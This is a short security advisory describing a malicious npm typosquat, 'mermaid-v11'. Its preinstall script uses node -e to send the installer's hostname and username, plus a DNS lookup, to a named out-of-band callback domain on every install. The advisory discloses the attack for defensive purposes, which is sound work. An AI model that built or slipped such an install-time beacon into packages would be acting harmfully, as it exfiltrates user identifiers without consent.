summary: mermaid-v11 typosquat exfiltrates host identifiers via preinstall to oast.site callback
details: Package impersonates the legitimate `mermaid` diagramming library under the name `mermaid-v11` with a bogus `9999.0.0` version. The tarball contains no library code — only a package.json whose `preinstall` script runs `node -e` to require `https` and `os`, then sends the installer's hostname and username to `https://d8ks495t5p5ut2enft8041g7fusnfsy5e.oast.site/?h=<hostname>&u=<username>&pkg=mermaid-v11` (an interactsh out-of-band callback subdomain) via HTTPS GET, plus a DNS lookup. This fires automatically on `npm install` without user consent. The combination of typosquat naming, no real package contents, and an automatic exfiltration beacon to an attacker-controlled OAST domain is a clear reconnaissance / victim-profiling payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
